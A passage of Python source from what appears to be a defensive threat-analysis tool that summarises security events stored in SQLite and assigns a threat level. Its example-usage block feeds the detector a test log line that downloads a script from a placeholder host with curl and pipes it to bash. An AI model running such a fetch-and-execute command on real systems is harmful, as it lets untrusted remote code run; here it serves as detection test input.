                # Get event counts by severity in the last 24 hours
                cursor.execute('''
                    SELECT severity, COUNT(*) as count FROM security_events
                    WHERE datetime(timestamp) > datetime('now', '-24 hours')
                    GROUP BY severity
                ''')
                
                for row in cursor.fetchall():
                    severity, count = row
                    summary['event_counts'][severity] = count
                    summary['event_counts']['total'] += count
                
                # Get active event chains
                cursor.execute('''
                    SELECT COUNT(*) FROM event_chains
                    WHERE datetime(end_timestamp) > datetime('now', '-12 hours')
                ''')
                
                summary['active_chains'] = cursor.fetchone()[0]
                
                # Get most recent high or critical events
                cursor.execute('''
                    SELECT * FROM security_events
                    WHERE severity IN ('high', 'critical')
                    AND datetime(timestamp) > datetime('now', '-24 hours')
                    ORDER BY timestamp DESC
                    LIMIT 5
                ''')
                
                for row in cursor.fetchall():
                    event = {
                        'id': row[0],
                        'timestamp': row[1],
                        'event_type': row[2],
                        'source': row[3],
                        'target': row[4],
                        'severity': row[5],
                        'details_summary': json.loads(row[7])[:100] if row[7] else {}
                    }
                    summary['recent_events'].append(event)
                
                conn.close()
                
                # Determine overall threat level
                if summary['event_counts'].get('critical', 0) > 0:
                    summary['threat_level'] = 'critical'
                elif summary['event_counts'].get('high', 0) > 0:
                    summary['threat_level'] = 'high'
                elif summary['event_counts'].get('medium', 0) > 0:
                    summary['threat_level'] = 'medium'
                    
        except Exception as e:
            self.logger.error(f"Error getting threat summary: {e}")
        
        return summary

# Example usage
if __name__ == '__main__':
    analyzer = EnhancedThreatAnalyzer()
    
    # Test log analysis
    test_log = "bash -c 'curl http://suspicious-site.com/malware.sh | bash'"
    result = analyzer.analyze_log_entry(test_log)
    
    print("Log Analysis Result:")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    # Test process analysis
    test_process = {
        'pid': 1234,
        'name': 'bash',
        'path': '/tmp/suspicious_script.sh',
        'user': 'root',
        'cpu_percent': 5.2,
        'memory_percent': 1.3
    }
    
    process_result = analyzer.analyze_process_activity(test_process)
    print("\nProcess Analysis Result:")
    print(json.dumps(process_result, indent=2, ensure_ascii=False))
    
    # Get threat summary
    summary = analyzer.get_threat_summary()
    print("\nThreat Summary:")
    print(json.dumps(summary, indent=2, ensure_ascii=False))
